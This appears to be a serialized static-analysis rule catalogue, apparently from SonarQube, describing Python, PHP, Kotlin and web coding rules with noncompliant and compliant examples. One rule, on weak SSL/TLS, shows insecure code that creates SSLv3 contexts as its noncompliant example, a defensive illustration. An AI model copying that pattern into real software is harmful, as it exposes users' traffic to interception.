<p>With the default provided regular expression: ^[a-z_][a-z0-9_]{2,30}$</p>
<pre>
def MyFunction(a,b):
    ...
</pre>
<h2>Compliant Solution</h2>
<pre>
def my_function(a,b):
    ...
</pre>Z
CODE_SMELL
˜
python:S1862Ê
pythonS1862BRelated "if/else if" statements should not have the same condition"MAJOR*py:Ä<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if param == 1:
  openWindow()
elif param == 2:
  closeWindow()
elif param == 1:            # Noncompliant
  moveWindowToTheBackground()
</pre>
<h2>Compliant Solution</h2>
<pre>
if param == 1:
  openWindow()
elif param == 2:
  closeWindow()
elif param == 3:
  moveWindowToTheBackground()
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
˚
python:S1142Í
pythonS11427Functions should not contain too many return statements"MAJOR*py:à<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
def fun():          # Noncompliant as there are 4 return statements
  if condition1:
    return True
  elif condition2:
    return False
  else:
    return True
  return False
</pre>Z
CODE_SMELL
‚
python:OneStatementPerLine√
pythonOneStatementPerLine&Statements should be on separate lines"MAJOR*py:‰<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (True): print("hello")
</pre>
<h2>Compliant Solution</h2>
<pre>
if (True):
    print("hello")
</pre>Z
CODE_SMELL
Å
python:PreIncrementDecrement‡
pythonPreIncrementDecrement4Increment and decrement operators should not be used"MAJOR*py:¯<p>Python has no pre/post increment/decrement operator. For instance, <code>x++</code> and <code>x--</code> will fail to parse. More importantly,
<code>++x</code> and <code>--x</code> will do nothing. To increment a number, simply write <code>x += 1</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
++x # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
x += 1
</pre>ZBUG
≥
python:S2757¢
pythonS2757'"=+" should not be used instead of "+=""MAJOR*py:◊<p>The use of operators pairs ( <code>=+</code> or <code>=-</code>) where the reversed, single operator was meant (<code>+=</code> or <code>-=</code>)
will run fine, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code> or <code>=-</code> is used without any spacing between the two operators and when there is at least
one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
target = -5
num = 3

target =- num  # Noncompliant; target = -3. Is that really what's meant?
target =+ num # Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
target = -5
num = 3

target = -num  # Compliant; intent to assign inverse value of num is clear
target += num
</pre>ZBUG
ƒ
python:S3923≥
pythonS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*py:∏<p>Having the same implementation in every branch of an <code>if</code> chain is an error. Either a copy-paste error was made and something different
should be executed, or there shouldn't be an <code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if b == 0:  # Noncompliant
    doOneMoreThing()
elif b == 1:
    doOneMoreThing()
else:
    doOneMoreThing()

b = 4 if a &gt; 12 else 4  # Noncompliant

</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s.</p>
<pre>
if b == 0:  # no issue, this could have been done on purpose to make the code more readable
    doOneMoreThing()
elif b == 1:
    doOneMoreThing()
</pre>ZBUG
®
python:S1700ó
pythonS1700=A field should not duplicate the name of its containing class"MAJOR*py:Ø<p>It's confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider
the common practice of naming a class instance for the class itself.</p>
<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular
aspect of the class it represents or holds.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo:
  foo = ''

  def getFoo(self):
    ...

foo = Foo()
foo.getFoo() # what does this return?
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo:
  name = ''

  def getName(self):
    ...

foo = Foo()
foo.getName()
</pre>Z
CODE_SMELL
î
python:S4423É
pythonS4423)Weak SSL/TLS protocols should not be used"MAJOR*py:¨<p>Older versions of SSL/TLS protocol like "SSLv3" have been proven to be insecure.</p>
<p>This rule raises an issue when an SSL/TLS context is created with an insecure protocol version, i.e. when one of the following constants is
detected in the code:</p>
<ul>
  <li> <code>OpenSSL.SSL.SSLv3_METHOD</code> (Use instead <code>OpenSSL.SSL.TLSv1_2_METHOD</code>) </li>
  <li> <code>ssl.PROTOCOL_SSLv3</code> (Use instead <code>ssl.PROTOCOL_TLSv1_2</code>) </li>
</ul>
<p>Protocol versions different from TLSv1.2 and TLSv1.3 are considered insecure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
from OpenSSL import SSL

SSL.Context(SSL.SSLv3_METHOD)  # Noncompliant
</pre>
<pre>
import ssl

ssl.SSLContext(ssl.PROTOCOL_SSLv3) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
from OpenSSL import SSL

SSL.Context(SSL.TLSv1_2_METHOD)  # Compliant
</pre>
<pre>
import ssl

ssl.SSLContext(ssl.PROTOCOL_TLSv1_2) # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https">Diagnosing TLS, SSL, and HTTPS</a> </li>
  <li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols">SSL and TLS Deployment Best
  Practices - Use secure protocols</a> </li>
</ul>ZVULNERABILITY
Ö
python:S1751Ù
pythonS17515Loops with at most one iteration should be refactored"MAJOR*py:õ<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>raise</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
while node is not None:
  node = node.parent()
  print(node)
  break
</pre>
<h2>Compliant Solution</h2>
<pre>
while node is not None:
  node = node.parent()
  print(node)
</pre>ZBUG
ç
python:S1871¸

pythonS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*py:˙	<p>Having two branches in the same <code>if</code> structure with the same implementation is at best duplicate code, and at worst a coding error. If
the same logic is truly needed for both instances, then they should be combined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if 0 &lt;= a &lt; 10:
    do_first()
    do_second()
elif 10 &lt;= a &lt; 20:
    do_the_other_thing()
elif 20 &lt;= a &lt; 50:
    do_first()         # Noncompliant; duplicates first condition
    do_second()
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored.</p>
<pre>
if 0 &lt;= a &lt; 10:
    do_first()
elif 10 &lt;= a &lt; 20:
    do_the_other_thing()
elif 20 &lt;= a &lt; 50:
    do_first()         # no issue, usually this is done on purpose to increase the readability
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s when all branches have the same single line of code. In
case of <code>if</code> chains with <code>else</code>-s rule <a href='/coding_rules#rule_key=python%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if 0 &lt;= a &lt; 10:
    do_first()
elif 20 &lt;= a &lt; 50:
    do_first()         # Noncompliant, this might have been done on purpose but probably not
</pre>Z
CODE_SMELL
∞	
python:S4144ü	
pythonS4144?Functions and methods should not have identical implementations"MAJOR*py:µ<p>When two functions or methods have the same implementation, either it was a mistake - something else was intended - or the duplication was
intentional, but may be confusing to maintainers. In the latter case, one implementation should invoke the other. Numerical and string literals are
not taken into account. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass:
    code = "bounteous"

    def calculate_code(self):
        self.do_the_thing()
        return self.__class__.code

    def get_name(self):  # Noncompliant
        self.do_the_thing()
        return self.__class__.code

    def do_the_thing(self):
        pass  # on purpose
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass:
    code = "bounteous"

    def calculate_code(self):
        self.do_the_thing()
        return self.__class__.code

    def get_name(self):
        return self.calculate_code()

    def do_the_thing(self):
        pass  # on purpose
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised on empty methods/functions and methods/functions with only one line of code.</p>Z
CODE_SMELL
€
python:S1110 
pythonS11100Redundant pairs of parentheses should be removed"MAJOR*py:Ô<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
return ((3))        # Noncompliant
return ((x + 1))    # Noncompliant
x = ((y / 2)) + 1   # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
return 3
return (3)
return x + 1
return (x + 1)
x = y / 2 + 1
x = (y / 2) + 1
</pre>Z
CODE_SMELL
Ç
python:S1717Ò
pythonS1717E"\" should only be used as an escape character outside of raw strings"MAJOR*py:à<p>Typically, backslashes are seen only as part of escape sequences. Therefore, the use of a backslash outside of a raw string or escape sequence
looks suspiciously like a broken escape sequence. </p>
<p>Characters recognized as escape-able are: <code>abfnrtvox\'"</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
s = "Hello \world."
t = "Nice to \ meet you"
u = "Let's have \ lunch"
</pre>
<h2>Compliant Solution</h2>
<pre>
s = "Hello world."
t = "Nice to \\ meet you"
u = r"Let's have \ lunch"  // raw string
</pre>ZBUG
Ó
python:PrintStatementUsageœ
pythonPrintStatementUsage(The "print" statement should not be used"MAJOR*py:Ó<p>The <code>print</code> statement was removed in Python 3.0. The built-in function should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
print '1'  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
print('1')
</pre>Z
CODE_SMELL
ƒ
python:CommentRegularExpression†
pythonCommentRegularExpression,Track comments matching a regular expression"MAJOR*py:¥<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>
<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing "REVIEW".</p>
<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in
<code>(?i).*REVIEW.*</code>.</p>@Z
CODE_SMELL
¶
python:S125ñ
pythonS125,Sections of code should not be commented out"MAJOR*py:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
ë
python:S4143Ä
pythonS41439Collection content should not be replaced unconditionally"MAJOR*py:£<p>It is highly suspicious when a value is saved in a collection for a given key or index and then unconditionally overwritten. Such replacements are
likely errors.</p>
<p>This rule raises an issue when the <a href="https://docs.python.org/3/reference/datamodel.html#object.__setitem__"><code>__setitem__</code></a>
method of the same object is called multiple times with the same index, slice or key without any other action done between the calls.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def swap(mylist, index1, index2):
    tmp = mylist[index2]
    mylist[index2] = mylist[index1]
    mylist[index2] = tmp  # Noncompliant

list2 = [0,1,2,3,4,5,6,7,8,9]
list2[3:5] = [42,42]
list2[3:5] = [42,42]  # Noncompliant

mymap = {'a': {}}
mymap['a']['b'] = 42
mymap['a']['b'] = 42  # Noncompliant
</pre>ZBUG
“
python:S1720¡
pythonS1720Docstrings should be defined"MAJOR*py:˙<p>A string literal that is the first statement in a module, function, class, or method is a docstring. A docstring should document what a caller
needs to know about the code. Information about what it does, what it returns, and what it requires are all valid candidates for documentation. Well
written docstrings allow callers to use your code without having to first read it and understand its logic.</p>
<p>By convention, docstrings are enclosed in three sets of double-quotes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def my_function(a,b):
</pre>
<h2>Compliant Solution</h2>
<pre>
def my_function(a,b):
      """Do X"""
</pre>Z
CODE_SMELL
´
python:S1764ö
pythonS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*py:´<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p>Note that this rule will raise issues on <code>a == a</code> and <code>a != a</code> expressions which are sometime used to detect <code>NaN</code>
values. It is recommended to use instead <a href="https://docs.python.org/3/library/math.html#math.isnan"><code>math.isnan</code></a> or an equivalent
function. This will improve code readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if a == a: # Noncompliant
    work()

if  a != a: # Noncompliant
    work()

if  a == b and a == b: # Noncompliant
    work()

if a == b or a == b: # Noncompliant
    work()

j = 5 / 5 # Noncompliant
k = 5 - 5 # Noncompliant
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> The expression <code>1 &lt;&lt; 1</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=python%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
ª
python:S1763™
pythonS1763All code should be reachable"MAJOR*py:Í<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, and <code>raise</code>) move control flow out of the current code
block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def fun(a):
  i = 10
  return i + a       # Noncompliant
  i += 1             # this is never executed
</pre>
<h2>Compliant Solution</h2>
<pre>
def fun(a):
  i = 10
  return i + a
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Ü
python:S5603ı
pythonS56032Unused scope-limited definitions should be removed"MAJOR*py:ò<p>When a class or function is defined in a parent function or method, it is only visible in this parent function or method's scope. If the defined
class or function is not used within this scope it is dead code, i.e. unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def noncompliant():
    def nested_function():  # Noncompliant
        print("nested_function")

    class NestedClass:  # Noncompliant
        def __init__(self):
            print("NestedClass")
</pre>
<h2>Compliant Solution</h2>
<pre>
def compliant():
    def nested_function():
        print("nested_function")

    class NestedClass:
        def __init__(self):
            print("NestedClass")

    nested_function()
    NestedClass()
</pre>Z
CODE_SMELL
ô
python:InequalityUsage˛
pythonInequalityUsage*"<>" should not be used to test inequality"MAJOR*py:ü<p>The forms <code>&lt;&gt;</code> and <code>!=</code> are equivalent. But in Python 2.7.3 the <code>&lt;&gt;</code> form is considered obsolete.</p>
<h2>Noncompliant Code Example</h2>
<pre>
return a &lt;&gt; b # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
return a != b
</pre>Z
CODE_SMELL
Ô
python:S3981ﬁ
pythonS3981?Collection sizes and array length comparisons should make sense"MAJOR*py:˚<p>The length of a collection is always greater than or equal to zero. So testing that a length is greater than or equal to zero doesn't make sense,
since the result is always <code>true</code>. Similarly testing that it is less than zero will always return <code>false</code>. Perhaps the intent
was to check the non-emptiness of the collection instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
mylist = []
if len(myList) &gt;= 0:  # Noncompliant
    pass

if len(myList) &lt; 0:  # Noncompliant
    pass
</pre>
<h2>Compliant Solution</h2>
<pre>
mylist = []
if len(myList) &gt;= 42:
    pass

if len(myList) == 0:
    pass
</pre>ZBUG
–
python:FileComplexity∂
pythonFileComplexityFiles should not be too complex"MAJOR*py:„<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Ø
common-php:FailedUnitTestsê

common-phpFailedUnitTests!Failed unit tests should be fixed"MAJOR*php:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
å
common-php:SkippedUnitTestsÏ

common-phpSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*php:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL

common-php:DuplicatedBlocks–

common-phpDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*php:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ö
%common-php:InsufficientCommentDensity

common-phpInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*php:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
⁄
#common-php:InsufficientLineCoverage≤

common-phpInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*php:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ê
%common-php:InsufficientBranchCoverageº

common-phpInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*php:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
∏
common-kotlin:FailedUnitTestsñ
common-kotlinFailedUnitTests!Failed unit tests should be fixed"MAJOR*kotlin:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
ï
common-kotlin:SkippedUnitTestsÚ
common-kotlinSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*kotlin:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
˘
common-kotlin:DuplicatedBlocks÷
common-kotlinDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*kotlin:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
£
(common-kotlin:InsufficientCommentDensityˆ
common-kotlinInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*kotlin:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
„
&common-kotlin:InsufficientLineCoverage∏
common-kotlinInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*kotlin:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ô
(common-kotlin:InsufficientBranchCoverage¬
common-kotlinInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*kotlin:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
¨
common-py:FailedUnitTestsé
	common-pyFailedUnitTests!Failed unit tests should be fixed"MAJOR*py:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
â
common-py:SkippedUnitTestsÍ
	common-pySkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*py:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
Ì
common-py:DuplicatedBlocksŒ
	common-pyDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*py:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ó
$common-py:InsufficientCommentDensityÓ
	common-pyInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*py:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
◊
"common-py:InsufficientLineCoverage∞
	common-pyInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*py:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
„
$common-py:InsufficientBranchCoverage∫
	common-pyInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*py:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
Ø
common-web:FailedUnitTestsê

common-webFailedUnitTests!Failed unit tests should be fixed"MAJOR*web:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
å
common-web:SkippedUnitTestsÏ

common-webSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*web:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL

common-web:DuplicatedBlocks–

common-webDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*web:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ö
%common-web:InsufficientCommentDensity

common-webInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*web:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
Ê
%common-web:InsufficientBranchCoverageº

common-webInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*web:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
⁄
#common-web:InsufficientLineCoverage≤

common-webInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*web:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ö
Web:IllegalNamespaceCheckÁ
WebIllegalNamespaceCheck6Track uses of disallowed namespaces in XHTML documents"MAJOR*web:¯<p>This rule allows to ban declaration of some namespaces in the root element of XHML documents.</p>
<h2>Noncompliant Code Example</h2>
<p>With a "namespaces" value of "http://java.sun.com/jsf/facelets":</p>
<pre>
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"
        xmlns:ui="http://java.sun.com/jsf/facelets"    &lt;!-- Noncompliant --&gt;
        xmlns:h="http://java.sun.com/jsf/html"
        xmlns:f="http://java.sun.com/jsf/core"&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"
        xmlns:h="http://java.sun.com/jsf/html"
        xmlns:f="http://java.sun.com/jsf/core"&gt;
</pre>Z
CODE_SMELL
◊
	Web:S1134…
WebS1134Track uses of "FIXME" tags"MAJOR*web:Ü<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
Ò	
	Web:S4645„	
WebS46452<script>...</script> elements should not be nested"MAJOR*web:è	<p>When parsing a script node, the browser treats its contents as plain text, and immediately finishes parsing when it finds the first closing
<code>&lt;/script&gt;</code> character sequence.</p>
<p>As a consequence, nested script nodes are not possible, because all opening <code>&lt;script&gt;</code> tags found along the way are ignored. </p>
<p>Web browsers doesn't support nested <code>&lt;script&gt;...&lt;/script&gt;</code> elements. But there is no error in such case and browers just
close the first encountered <code>&lt;script&gt;</code> tag as soon as a closing <code>&lt;/script&gt;</code> tag is found along the way. So there is
a big chance to display something totally unexpected to the end-users. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;script type="text/template"&gt;
  &lt;div&gt;
    Hello!
  &lt;/div&gt;
  &lt;script type="text/javascript"&gt;  &lt;!-- Noncompliant --&gt;
    alert("Hi!");
  &lt;/script&gt;
&lt;/script&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;script type="text/javascript"&gt;
  alert("Hi!");
&lt;/script&gt;

&lt;script type="text/template"&gt;
  &lt;div&gt;
    Hello!
  &lt;/div&gt;
&lt;/script&gt;
</pre>ZBUG
‰
	Web:S5256÷
WebS5256Tables should have headers"MAJOR*web:ö<p>Assistive technologies, such as screen readers, use <code>&lt;th&gt;</code> headers to provide some context when users navigates a table. Without
it the user gets rapidly lost in the flow of data.</p>
<p>Headers should be properly associated with the corresponding <code>&lt;td&gt;</code>&nbsp;cells by using either a <code>scope</code> attribute or
<code>headers</code> and <code>id</code> attributes. See&nbsp;<a href="https://www.w3.org/WAI/tutorials/tables/tips/">W3C WAI&nbsp;Web Accessibility
Tutorials</a>&nbsp;for more information.</p>
<p>This rule raises an issue whenever a <code>&lt;table&gt;</code> does not contain any&nbsp;<code>&lt;th&gt;</code>&nbsp;elements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table&gt; &lt;!-- Noncompliant --&gt;
  &lt;tr&gt;
    &lt;td&gt;Name&lt;/td&gt;
    &lt;td&gt;Age&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;John Doe&lt;/td&gt;
    &lt;td&gt;24&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Alice Doe&lt;/td&gt;
    &lt;td&gt;54&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;table&gt;
  &lt;tr&gt;
    &lt;th scope="col"&gt;Name&lt;/th&gt;
    &lt;th scope="col"&gt;Age&lt;/th&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;John Doe&lt;/td&gt;
    &lt;td&gt;24&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Alice Doe&lt;/td&gt;
    &lt;td&gt;54&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised on &lt;table&gt; used for layout purpose, i.e. when it contains a <code>role</code> attribute set to
<code>"presentation"</code> or <code>"none"</code>. Note that <a href="https://www.w3schools.com/html/html_layout.asp">using &lt;table&gt; for layout
purpose is a bad practice</a>.</p>
<p>No issue will be raised on &lt;table&gt; containing an <code>aria-hidden</code> attribute set to <code>"true"</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-content-structure-separation-programmatic">WCAG2, 1.3.1</a>&nbsp;-&nbsp;Info
  and Relationships </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H51">WCAG2,&nbsp;H51</a> - Using table markup to present tabular information </li>
</ul>ZBUG
Ä
Web:PageWithoutTitleCheck‚
WebPageWithoutTitleCheck("<title>" should be present in all pages"MAJOR*web:à<p>Titles are important because they are displayed in search engine results as well as the browser's toolbar.</p>
<p>This rule verifies that the <code>&lt;head&gt;</code> tag contains a <code>&lt;title&gt;</code> one, and the <code>&lt;html&gt;</code> tag a
<code>&lt;head&gt;</code> one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;html&gt;         &lt;!-- Non-Compliant --&gt;

&lt;body&gt;
...
&lt;/body&gt;

&lt;/html&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;html&gt;         &lt;!-- Compliant --&gt;

&lt;head&gt;
  &lt;title&gt;Some relevant title&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
...
&lt;/body&gt;

&lt;/html&gt;
</pre>ZBUG
“
	Web:S5255ƒ
WebS5255]"aria-label" or "aria-labelledby" attributes should be used to differentiate similar elements"MAJOR*web:æ<p>If a page contains multiple <code>&lt;nav&gt;</code>&nbsp;or <code>&lt;aside&gt;</code> elements, each one should have an <code>aria-label</code>
or <code>aria-labelledby</code> attribute so that they can be differentiated. The same rule applies when multiple elements have
a&nbsp;<code>role</code> attribute with the same "landmark" value.</p>
